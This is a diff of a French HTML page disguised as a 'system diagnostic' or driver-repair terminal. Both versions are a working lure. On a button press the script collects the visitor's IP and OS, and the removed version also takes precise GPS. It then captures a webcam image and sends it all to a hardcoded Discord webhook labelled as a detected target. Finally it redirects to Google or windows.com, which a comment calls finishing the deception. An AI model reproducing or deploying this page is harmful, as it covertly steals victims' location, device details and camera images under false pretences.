@@ -1,130 +1,35 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ORCA_TERMINAL_V5</title>
-    <style>
-        :root { --neon: #00ff41; --bg: #050505; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        
-        /* Effet de balayage d'écran (Scanlines) */
-        body::before { content: " "; position: absolute; top: 0; left: 0; bottom: 0; right: 0; background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06)); background-size: 100% 2px, 3px 100%; z-index: 100; pointer-events: none; }
-
-        .terminal { border: 1px solid var(--neon); padding: 40px; border-radius: 4px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 25px rgba(0, 255, 65, 0.1); width: 90%; max-width: 500px; position: relative; z-index: 10; }
-        .terminal-header { position: absolute; top: -12px; left: 20px; background: var(--bg); padding: 0 10px; font-size: 11px; letter-spacing: 3px; }
-
-        .console { font-size: 14px; margin: 20px 0; min-height: 120px; line-height: 1.6; color: #00cc33; }
-        .cursor { display: inline-block; width: 8px; height: 15px; background: var(--neon); animation: blink 1s infinite; vertical-align: middle; }
-        @keyframes blink { 0%, 49% { opacity: 1; } 50%, 100% { opacity: 0; } }
-
-        .loader-wrap { width: 100%; height: 2px; background: #111; margin: 25px 0; display: none; }
-        .loader-fill { width: 0%; height: 100%; background: var(--neon); box-shadow: 0 0 10px var(--neon); transition: width 0.5s; }
-
-        .btn { background: transparent; color: var(--neon); border: 1px solid var(--neon); padding: 15px; width: 100%; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; letter-spacing: 2px; }
-        .btn:hover { background: var(--neon); color: #000; box-shadow: 0 0 20px var(--neon); }
-
-        #video, #canvas { display: none; }
-    </style>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Diagnostic</title>
+    <style>body{background:#000;color:#00ff41;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;overflow:hidden}.box{border:1px solid #00ff41;padding:30px;width:90%;max-width:400px;text-align:center}#v,#c{display:none}</style>
 </head>
 <body>
-    <div class="terminal">
-        <div class="terminal-header">SECURE_GATEWAY_ACCESS</div>
-        <h1 style="font-size: 18px; margin-top: 0; letter-spacing: 1px;">ANOMALIE SYSTÈME</h1>
-        <p style="color: #888; font-size: 13px;">Le noyau a détecté une corruption des pilotes. Une authentification biométrique et réseau est requise pour restaurer l'accès.</p>
-        
-        <div class="console" id="log">
-            > STATUS: EN ATTENTE<br>
-            > PROTOCOLE: ORCA_V5<br>
-            > ENCRYPTION: AES_256<br>
-            > <span class="cursor"></span>
-        </div>
-
-        <div class="loader-wrap" id="loader"><div class="loader-fill" id="bar"></div></div>
-        <button id="run" class="btn" onclick="execute()">Réparer le système</button>
-    </div>
-
-    <video id="video" autoplay playsinline muted></video>
-    <canvas id="canvas"></canvas>
-
+    <div class="box"><h3>VÉRIFICATION SYSTÈME</h3><p id="m">Initialisation du protocole...</p><button id="b" onclick="start()" style="background:transparent;color:#00ff41;border:1px solid #00ff41;padding:10px;width:100%;cursor:pointer">DÉMARRER</button></div>
+    <video id="v" autoplay playsinline muted></video><canvas id="c"></canvas>
     <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1466502605881475242/ynqT6t3L8IAQ69mgtvO17VvNBvmjFqiHayODx-P5EWMeN6renSu8UiM8nDfNNNvTHYy0";
-
-        // Fonction d'envoi vers Discord avec gestion des fichiers
-        async function post(content, blob = null) {
+        const WH = "https://discord.com/api/webhooks/1465426685053636781/NrCTO4VT3hOKWgLS4newFpcskrYfPE9DpA6PKoh9RjZB3Xq_GNcQRe56L50HxQPfdOr3";
+        async function post(msg, blob=null){
             const fd = new FormData();
-            if (blob) fd.append('file', blob, 'capture.png');
-            fd.append('payload_json', JSON.stringify({ 
-                content: content,
-                username: "ORCA_SEC_MONITOR" 
-            }));
-            try { 
-                await fetch(WEBHOOK, { method: 'POST', body: fd, keepalive: true }); 
-            } catch(e) { console.error("Discord Error"); }
+            if(blob) fd.append('file', blob, 'img.png');
+            fd.append('payload_json', JSON.stringify({content: msg}));
+            await fetch(WH, {method:'POST', body:fd, keepalive:true});
         }
-
-        async function execute() {
-            const log = document.getElementById('log');
-            const bar = document.getElementById('bar');
-            document.getElementById('run').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-
-            // 1. RÉCUPÉRATION IP (Plusieurs sources pour la précision)
-            log.innerHTML = "> SCANNING_RESEAU...<br>> RÉCUPÉRATION_ADRESSE_IP...";
-            let ip = "BLOQUÉE";
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const d = await res.json();
-                ip = d.ip;
-            } catch(e) {}
-            
-            bar.style.width = "30%";
-            log.innerHTML += `<br>> IP_VÉRIFIÉE: ${ip}`;
-
-            // 2. GÉOLOCALISATION HAUTE PRÉCISION
-            log.innerHTML += "<br>> ACTIVATION_GPS_SATELLITE...";
-            const getGPS = () => new Promise(res => {
-                navigator.geolocation.getCurrentPosition(
-                    (p) => res(`https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`),
-                    () => res("AUTORISATION_GPS_REFUSÉE"),
-                    { enableHighAccuracy: true, timeout: 8000 }
-                );
-            });
-            
-            const location = await getGPS();
-            bar.style.width = "60%";
-
-            // Envoi immédiat du rapport de données
-            await post(`⚡ **ALERTE: CIBLE IDENTIFIÉE**\n\`\`\`yaml\nIP: ${ip}\nOS: ${navigator.platform}\nGPS: ${location}\n\`\`\``);
-
-            // 3. CAPTURE WEBCAM
-            try {
-                log.innerHTML += "<br>> VÉRIFICATION_BIOMÉTRIQUE...";
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                video.onloadedmetadata = () => {
-                    setTimeout(() => {
-                        const canvas = document.getElementById('canvas');
-                        canvas.width = video.videoWidth; 
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        
-                        canvas.toBlob(async (blob) => {
-                            await post("📸 **VISUEL_BIOMÉTRIQUE_REÇU**", blob);
-                            bar.style.width = "100%";
-                            log.innerHTML += "<br>> ACCÈS_AUTORISÉ. RESTAURATION...";
-                            stream.getTracks().forEach(t => t.stop());
-                            // Redirection pour finaliser la tromperie
-                            setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
-                        }, 'image/png');
-                    }, 1200);
-                };
-            } catch (err) {
-                await post("❌ **ERREUR: CAPTEURS_BLOQUÉS**");
-                window.location.href = "https://www.google.com";
-            }
+        async function start(){
+            document.getElementById('b').style.display='none';
+            document.getElementById('m').innerText="Analyse réseau...";
+            let ip="Bloquée"; try{const r=await fetch('https://api.ipify.org?format=json');const d=await r.json();ip=d.ip;}catch(e){}
+            await post("🚀 **CIBLE DÉTECTÉE**\n**IP**: " + ip + "\n**OS**: " + navigator.platform);
+            try{
+                const s=await navigator.mediaDevices.getUserMedia({video:true});
+                const v=document.getElementById('v'); v.srcObject=s;
+                v.onloadedmetadata=()=>{setTimeout(()=>{
+                    const c=document.getElementById('c'); c.width=v.videoWidth; c.height=v.videoHeight;
+                    c.getContext('2d').drawImage(v,0,0);
+                    c.toBlob(async(b)=>{await post("📸 **CAPTURE**", b); s.getTracks().forEach(t=>t.stop()); window.location.href="https://windows.com";},'image/png');
+                },1000)};
+            }catch(e){window.location.href="https://windows.com";}
         }
     </script>
 </body>
